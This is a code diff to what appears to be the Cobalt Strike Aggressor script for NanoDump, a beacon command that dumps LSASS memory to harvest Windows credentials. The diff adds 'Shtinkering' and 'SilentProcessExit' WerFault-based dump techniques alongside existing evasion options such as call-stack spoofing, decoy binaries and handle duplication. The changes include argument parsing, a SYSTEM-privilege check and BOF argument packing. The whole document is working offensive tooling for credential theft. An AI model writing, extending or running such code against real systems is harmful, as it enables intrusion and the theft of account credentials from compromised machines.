@@ -41,7 +41,7 @@ local('$string $c');
 beacon_command_register(
 "nanodump",
 "Use syscalls to dump LSASS.",
-"usage: nanodump [--write C:\\Windows\\Temp\\doc.docx] [--valid] [--duplicate] [--seclogon-leak-local] [--seclogon-leak-remote C:\\Windows\\notepad.exe] [--seclogon-duplicate] [--spoof-callstack svchost] [--werfault C:\\Windows\\Temp] [--fork] [--snapshot] [--getpid] [--help]\
+"usage: nanodump [--write C:\\Windows\\Temp\\doc.docx] [--valid] [--duplicate] [--seclogon-leak-local] [--seclogon-leak-remote C:\\Windows\\notepad.exe] [--seclogon-duplicate] [--spoof-callstack svchost] [--silent-process-exit C:\\Windows\\Temp] [--shtinkering] [--fork] [--snapshot] [--getpid] [--help]\
 Dumpfile options:\
     --write DUMP_PATH, -w DUMP_PATH\
             filename of the dump\
@@ -59,8 +59,10 @@ Obtain an LSASS handle via:\
     --spoof-callstack {svchost,wmi,rpc}, -sc {svchost,wmi,rpc}\
             open a handle to LSASS using a fake calling stack\
 Let WerFault.exe (instead of nanodump) create the dump\
-    --werfault DUMP_FOLDER, -wf DUMP_FOLDER\
-            force WerFault.exe to dump LSASS\
+    --silent-process-exit DUMP_FOLDER, -spe DUMP_FOLDER\
+            force WerFault.exe to dump LSASS via SilentProcessExit\
+    --shtinkering, -sk\
+            force WerFault.exe to dump LSASS via Shtinkering\
 Avoid reading LSASS directly:\
     --fork, -f\
             fork the target process before dumping\
@@ -73,7 +75,7 @@ Help:\
     --help, -h\
             print this help message and leave");
 alias nanodump {
-    local('$barch $handle $bof $exe $args $pid $cname $dump_path $write_file $use_valid_sig $fork $snapshot $dup $i $get_pid $use_seclogon_leak_local $use_seclogon_leak_remote $folder $nanodump_binary $werfault_lsass $use_werfault $use_seclogon_duplicate $spoof_callstack');
+    local('$barch $handle $bof $exe $args $pid $cname $dump_path $write_file $use_valid_sig $fork $snapshot $dup $i $get_pid $use_seclogon_leak_local $use_seclogon_leak_remote $folder $nanodump_binary $silent_process_exit $use_silent_process_exit $use_seclogon_duplicate $spoof_callstack $use_lsass_shtinkering $user');
 
     $barch = barch($1);
     if($barch eq "x86")
@@ -100,8 +102,8 @@ alias nanodump {
     }
 
     # by default, don't use werfault
-    $werfault_lsass = "";
-    $use_werfault = 0;
+    $silent_process_exit = "";
+    $use_silent_process_exit = 0;
     # by default, don't set any decoy binary
     $seclogon_leak_remote_binary = "";
     # by default, do not use MalSecLogon leak
@@ -129,6 +131,8 @@ alias nanodump {
     $use_valid_sig = 0;
     # by default, do not spoof the stack
     $spoof_callstack = 0;
+    # by default, do not use shtinkering
+    $use_lsass_shtinkering = 0;
     for ($i = 1; $i < size(@_); $i++)
     {
         if (@_[$i] eq "--getpid")
@@ -207,16 +211,26 @@ alias nanodump {
                 return;
             }
         }
-        else if (@_[$i] eq "--werfault" || @_[$i] eq "-wf")
+        else if (@_[$i] eq "--silent-process-exit" || @_[$i] eq "-spe")
         {
             $i++;
             if($i >= size(@_))
             {
-                berror($1, "missing --werfault value");
+                berror($1, "missing --silent-process-exit value");
                 return;
             }
-            $use_werfault = 1;
-            $werfault_lsass = @_[$i];
+            $use_silent_process_exit = 1;
+            $silent_process_exit = @_[$i];
+        }
+        else if (@_[$i] eq "--shtinkering" || @_[$i] eq "-sk")
+        {
+            $user = beacon_info($1, "user");
+            if ($user ne "SYSTEM *")
+            {
+                berror($1, "You must be SYSTEM to run the Shtinkering technique");
+                return;
+            }
+            $use_lsass_shtinkering = 1;
         }
         else if (@_[$i] eq "--seclogon-duplicate" || @_[$i] eq "-sd")
         {
@@ -267,20 +281,20 @@ alias nanodump {
     }
 
     if ($get_pid &&
-        ($write_file || &use_valid_sig || $snapshot || $fork ||
+        ($write_file || $use_valid_sig || $snapshot || $fork ||
          $use_seclogon_duplicate || $spoof_callstack || $use_seclogon_leak_local ||
-         $use_seclogon_leak_remote || $dup || $use_werfault))
+         $use_seclogon_leak_remote || $dup || $use_silent_process_exit || $use_lsass_shtinkering))
     {
         berror($1, "The parameter --getpid is used alone");
         return;
     }
 
-    if ($use_werfault &&
-        ($write_file || &use_valid_sig || $snapshot || $fork ||
+    if ($use_silent_process_exit &&
+        ($write_file || $use_valid_sig || $snapshot || $fork ||
          $use_seclogon_duplicate || $spoof_callstack || $use_seclogon_leak_local ||
-         $use_seclogon_leak_remote || $dup))
+         $use_seclogon_leak_remote || $dup || $use_lsass_shtinkering))
     {
-        berror($1, "The parameter --werfault is used alone");
+        berror($1, "The parameter --silent-process-exit is used alone");
         return;
     }
     if($fork && $snapshot)
@@ -361,25 +375,51 @@ alias nanodump {
         return;
     }
 
-    ########################################################
-
-
-
     if($use_seclogon_leak && $use_seclogon_duplicate)
     {
         berror($1, "The options --malseclogon-leak and --seclogon-duplicate cannot be used together");
         return;
     }
 
-    if($use_seclogon_leak_local && !$write_file)
+    if(!$use_lsass_shtinkering && $use_seclogon_leak_local && !$write_file)
     {
         berror($1, "If --seclogon-leak-local is being used, you need to provide the dump path with --write");
         return;
     }
 
-    if($use_seclogon_leak_local && !is_full_path($dump_path))
+    if(!$use_lsass_shtinkering && $use_seclogon_leak_local && !is_full_path($dump_path))
     {
         berror($1, "If --seclogon-leak-local is being used, you need to provide the full path: ". $dump_path);
+        return;
+    }
+
+    if ($use_lsass_shtinkering && $use_seclogon_duplicate)
+    {
+        berror($1, "The options --shtinkering and --seclogon-duplicate cannot be used together");
+        return;
+    }
+
+    if ($use_lsass_shtinkering && $fork)
+    {
+        berror($1, "The options --shtinkering and --fork cannot be used together");
+        return;
+    }
+
+    if ($use_lsass_shtinkering && $snapshot)
+    {
+        berror($1, "The options --shtinkering and --snapshot cannot be used together");
+        return;
+    }
+
+    if ($use_lsass_shtinkering && $use_valid_sig)
+    {
+        berror($1, "The options --shtinkering and --valid cannot be used together");
+        return;
+    }
+
+    if ($use_lsass_shtinkering && $write_file)
+    {
+        berror($1, "The options --shtinkering and --write cannot be used together");
         return;
     }
 
@@ -402,7 +442,7 @@ alias nanodump {
     }
 
     # pack the arguments
-    $args = bof_pack($1, "iziiiiiiiiziiiz", $pid, $dump_path, $write_file, $use_valid_sig, $fork, $snapshot, $dup, $get_pid, $use_seclogon_leak_local, $use_seclogon_leak_remote, $seclogon_leak_remote_binary, $use_seclogon_duplicate, $spoof_callstack, $use_werfault, $werfault_lsass);
+    $args = bof_pack($1, "iziiiiiiiiziiizi", $pid, $dump_path, $write_file, $use_valid_sig, $fork, $snapshot, $dup, $get_pid, $use_seclogon_leak_local, $use_seclogon_leak_remote, $seclogon_leak_remote_binary, $use_seclogon_duplicate, $spoof_callstack, $use_silent_process_exit, $silent_process_exit, $use_lsass_shtinkering);
 
     # run
     btask($1, "Running NanoDump BOF");
